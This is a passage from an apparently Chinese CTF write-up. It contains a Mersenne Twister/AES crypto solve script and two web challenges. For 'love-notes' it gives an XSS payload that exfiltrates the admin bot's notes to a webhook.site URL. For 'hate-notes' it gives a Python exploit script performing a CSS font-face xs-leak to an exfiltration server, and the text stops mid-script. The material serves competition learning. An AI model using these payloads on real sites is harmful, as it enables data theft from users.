<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> agcd_attack <span class="keyword">import</span> attack</span><br><span class="line"><span class="keyword">from</span> output <span class="keyword">import</span> output</span><br><span class="line"><span class="keyword">from</span> gf2bv <span class="keyword">import</span> LinearSystem</span><br><span class="line"><span class="keyword">from</span> gf2bv.crypto.mt <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mt19937</span>(<span class="params">out</span>):</span><br><span class="line">    lin = LinearSystem([<span class="number">32</span>] * <span class="number">624</span>)</span><br><span class="line">    mt = lin.gens()</span><br><span class="line"></span><br><span class="line">    rng = MT19937(mt)</span><br><span class="line">    zeros = []</span><br><span class="line">    zeros.append(rng.getrandbits(<span class="number">19968</span>) ^ <span class="built_in">int</span>(out))</span><br><span class="line">    zeros.append(mt[<span class="number">0</span>] ^ <span class="built_in">int</span>(<span class="number">0x80000000</span>))</span><br><span class="line">    sol = lin.solve_one(zeros)</span><br><span class="line">    rng = MT19937(sol)</span><br><span class="line">    pyrand = rng.to_python_random()</span><br><span class="line">    <span class="keyword">return</span> pyrand</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve rng</span></span><br><span class="line">block = <span class="number">2500</span></span><br><span class="line">c = [output[i * block : i * block + block] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output) // block)]</span><br><span class="line">rngs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="built_in">len</span>(c)):</span><br><span class="line">    out = c[i]</span><br><span class="line">    cc = out[:<span class="number">10</span>]</span><br><span class="line">    p = attack(cc, <span class="number">30</span>)</span><br><span class="line">    cf = out[:-<span class="number">4</span>]</span><br><span class="line">    u = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cf:</span><br><span class="line">        u.append(i % p % <span class="number">256</span>)</span><br><span class="line">    m = bytes_to_long(<span class="built_in">bytes</span>([<span class="number">0</span>] * <span class="number">4</span> + u))</span><br><span class="line">    rng = mt19937(m)</span><br><span class="line">    rngs.append(rng)</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve key</span></span><br><span class="line">ms = []</span><br><span class="line">iii = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> out <span class="keyword">in</span> c:</span><br><span class="line">    s = long_to_bytes(rngs[iii].getrandbits(<span class="number">20000</span>))</span><br><span class="line">    cc = out[:<span class="number">10</span>]</span><br><span class="line">    p = attack(cc, <span class="number">30</span>)</span><br><span class="line">    cf = out[-<span class="number">4</span>:]</span><br><span class="line">    u = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cf:</span><br><span class="line">        u.append(i % p % <span class="number">256</span>)</span><br><span class="line">    ss = [i <span class="keyword">for</span> i <span class="keyword">in</span> s[:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(ss[i] * ((m &gt;&gt; <span class="number">2</span> * i) &amp; <span class="number">0x03</span>) % <span class="number">0x101</span> == u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)):</span><br><span class="line">            ms.append(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(ms)</span><br><span class="line">    iii += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># solve flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;b76796081756e51e16e937ee2c6b913327cfc2b3008241e9b0b9387e908cfaf1f62d73bcdd98c670b6f84f22d94523c0&#x27;</span></span><br><span class="line">String = <span class="built_in">bytes</span>(ms)</span><br><span class="line"><span class="built_in">print</span>(AES.new(md5(String).digest(),AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(enc)))</span><br></pre></td></tr></table></figure>

<h2 id="WEB（26-26）"><a href="#WEB（26-26）" class="headerlink" title="WEB（26&#x2F;26）"></a>WEB（26&#x2F;26）</h2><h3 id="love-notes"><a href="#love-notes" class="headerlink" title="love-notes"></a>love-notes</h3><p>Crewctf 原题 留给@周怡 </p>
<p> @董明洋 嘿嘿，不好意思之前没看到，你讲的是我才发现@我了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag`存放在`admin`的note中，`id`号未知。但是`bot`使用`admin`账号访问用户`report`的`note</span><br></pre></td></tr></table></figure>

<p>首先判断<code>xss</code>点：位于 <code>title</code> 处</p>
<p><code>bot</code>访问<code>note</code>时<code>url</code>为 <code>/dashboard?reviewNote=&#39;+noteId</code>，而通过 <code>/api/notes/noteId</code>访问笔记时不受CSP的限制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bot访问note</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">ctx, email, password, noteId</span>)&#123;</span><br><span class="line">    page = <span class="keyword">await</span> ctx.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="comment">// login</span></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="variable constant_">HOSTNAME</span> + <span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&#x27;input[name=email]&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;input[name=email]&#x27;</span>, email);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&#x27;input[name=password]&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;input[name=password]&#x27;</span>, password); </span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&#x27;button[type=submit]&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;button[type=submit]&#x27;</span>)</span><br><span class="line">    <span class="comment">// Review note</span></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="variable constant_">HOSTNAME</span> + <span class="string">&#x27;/dashboard?reviewNote=&#x27;</span>+noteId);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;page.<span class="title function_">close</span>()&#125; <span class="keyword">catch</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /api/notes/noteId访问note</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/:noteId&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; noteId &#125; = req.<span class="property">params</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findById</span>(noteId);</span><br><span class="line">    <span class="keyword">if</span> (!note) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Note not found&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Look mom, I wrote a raw HTTP response all by myself!</span></span><br><span class="line">    <span class="comment">// Can I go outside now and play with my friends?</span></span><br><span class="line">    <span class="keyword">const</span> responseMessage = <span class="string">`HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Date: Sun, 7 Nov 1917 11:26:07 GMT</span></span><br><span class="line"><span class="string">Last-Modified: the-second-you-blinked</span></span><br><span class="line"><span class="string">Type: flag-extra-salty, thanks</span></span><br><span class="line"><span class="string">Length: 1337 bytes of pain</span></span><br><span class="line"><span class="string">Server: thehackerscrew/1970 </span></span><br><span class="line"><span class="string">Cache-Control: never-ever-cache-this</span></span><br><span class="line"><span class="string">Allow: pizza, hugs, high-fives</span></span><br><span class="line"><span class="string">X-CTF-Player-Reminder: drink-water-and-keep-hydrated</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;note.title&#125;</span>: <span class="subst">$&#123;note.content&#125;</span></span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    res.<span class="property">socket</span>.<span class="title function_">end</span>(responseMessage)</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Server error&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>且访问 <code>/api/notes</code>可直接展示当前用户的所有<code>notes</code></p>
<p>故构造的<code>payloads</code>如下：2条笔记</p>
<p>note1：<code>bot</code>访问该笔记后，回先访问<code>admin</code>的所有笔记，然后将其发到外部服务器</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/notes&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">  .<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&quot;https://webhook.site/9ca0f2db-1ba7-4cd5-b486-f01160687805/?sss=&quot;</span> + <span class="built_in">encodeURIComponent</span>(html));</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>note 2：使用<code>meta</code>标签，使得<code>bot</code>访问该笔记后自动跳转的<code>note1</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=https://target_ip/api/notes/note1_Id&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="hate-notes"><a href="#hate-notes" class="headerlink" title="hate-notes"></a>hate-notes</h3><p>即love-notes的预期解法，xs-leak</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="string">&#x27;none&#x27;</span></span><br></pre></td></tr></table></figure>

<p>新的CSP 阻止了love-notes中在&#x2F;api下的xss</p>
<p>反过来看原来预留的CSP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.setHeader(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, `script-src <span class="variable">$&#123;host&#125;</span>/static/dashboard.js https://js.hcaptcha.com/1/api.js; style-src <span class="variable">$&#123;host&#125;</span>/static/; img-src <span class="string">&#x27;none&#x27;</span>; connect-src <span class="string">&#x27;self&#x27;</span>; media-src <span class="string">&#x27;none&#x27;</span>; object-src <span class="string">&#x27;none&#x27;</span>; prefetch-src <span class="string">&#x27;none&#x27;</span>; frame-ancestors <span class="string">&#x27;none&#x27;</span>; form-action <span class="string">&#x27;self&#x27;</span>; frame-src <span class="string">&#x27;none&#x27;</span>;`);</span><br></pre></td></tr></table></figure>

<p>style-src 允许 static 下的css</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!requestedPath.endsWith(<span class="string">&#x27;.js&#x27;</span>) &amp;&amp; !requestedPath.endsWith(<span class="string">&#x27;.css&#x27;</span>)) &#123;</span><br><span class="line">  <span class="built_in">return</span> res.redirect(requestedPath.replaceAll(<span class="string">&#x27;/static&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<p>路径可以多加&#x2F;static 将笔记作为css</p>
<p>相对应的继续跟love-notes一样做一次跳转，完成xsleak</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://localhost:8000&quot;</span></span><br><span class="line">EXFILTRATION_HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">EXFILTRATION_PORT = <span class="number">8080</span></span><br><span class="line">EXFILTRATION_URL = <span class="string">f&quot;http://<span class="subst">&#123;EXFILTRATION_HOST&#125;</span>:<span class="subst">&#123;EXFILTRATION_PORT&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局变量</span></span><br><span class="line">current_uid = <span class="string">&quot;&quot;</span></span><br><span class="line">detected_chars = <span class="built_in">set</span>()</span><br><span class="line">attack_running = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask API端点 - 接收渗出数据</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/exfil&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exfil</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收从目标泄漏的字符数据&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> detected_chars</span><br><span class="line">    char_id = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> char_id:</span><br><span class="line">        detected_chars.add(char_id)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 接收到字符: <span class="subst">&#123;char_id&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册用户</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">user, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/auth/register&quot;</span>,</span><br><span class="line">            data=&#123;<span class="string">&#x27;email&#x27;</span>: user, <span class="string">&#x27;password&#x27;</span>: password&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;注册失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录获取token</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">user, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/auth/login&quot;</span>,</span><br><span class="line">            data=&#123;<span class="string">&#x27;email&#x27;</span>: user, <span class="string">&#x27;password&#x27;</span>: password&#125;,</span><br><span class="line">            allow_redirects=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> r.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;登录失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建第一个CSS payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_first_payload</span>(<span class="params">cookie</span>):</span><br><span class="line">    <span class="keyword">global</span> current_uid</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> string.hexdigits[:<span class="number">16</span>]:</span><br><span class="line">        character = current_uid + letter</span><br><span class="line">        payload += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @font-face &#123;&#123;</span></span><br><span class="line"><span class="string">          font-family: exfilFont<span class="subst">&#123;character&#125;</span>;</span></span><br><span class="line"><span class="string">          src: url(<span class="subst">&#123;EXFILTRATION_URL&#125;</span>/exfil?id=<span class="subst">&#123;character&#125;</span>);</span></span><br><span class="line"><span class="string">        &#125;&#125;</span></span><br><span class="line"><span class="string">        a[href^=&#x27;/api/notes/<span class="subst">&#123;character&#125;</span>&#x27;] &#123;&#123;</span></span><br><span class="line"><span class="string">          font-family: exfilFont<span class="subst">&#123;character&#125;</span>;</span></span><br><span class="line"><span class="string">        &#125;&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/notes&quot;</span>,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;token&#x27;</span>: cookie&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;title&#x27;</span>: payload, <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27; &#x27;</span>&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> json.loads(response.text).get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;创建第一个payload失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建第二个引用payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_second_payload</span>(<span class="params">first_id, cookie</span>):</span><br><span class="line">    payload = <span class="string">f&quot;&quot;&quot;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/api/notes/<span class="subst">&#123;first_id&#125;</span>&quot;/&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/notes&quot;</span>,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;token&#x27;</span>: cookie&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;title&#x27;</span>: payload, <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27; &#x27;</span>&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> json.loads(response.text).get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;创建第二个payload失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 报告笔记</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report_note</span>(<span class="params">note_id, cookie</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/report&quot;</span>,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;token&#x27;</span>: cookie&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;noteId&#x27;</span>: note_id&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;报告失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动化攻击循环</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack_loop</span>():</span><br><span class="line">    <span class="keyword">global</span> current_uid, attack_running</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成随机用户</span></span><br><span class="line">    user = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.digits + string.ascii_letters, k=<span class="number">10</span>))</span><br><span class="line">    password = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.digits + string.ascii_letters, k=<span class="number">10</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;使用用户: <span class="subst">&#123;user&#125;</span> 密码: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 注册登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> register(user, password):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    cookie = login(user, password)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># UID格式: 8-4-4-4-12 (共36字符)</span></span><br><span class="line">    <span 